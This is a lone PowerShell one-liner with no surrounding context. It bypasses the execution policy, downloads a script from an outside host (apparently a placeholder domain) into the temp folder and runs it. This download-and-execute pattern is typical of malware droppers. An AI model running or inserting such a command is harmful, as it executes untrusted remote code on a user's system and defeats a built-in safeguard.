powershell -ep bypass -c "IWR (\"https://get.example.org/install/setup.ps1\") -OutFile $env:TEMP\s.ps1; powershell -ep bypass -File $env:TEMP\s.ps1"
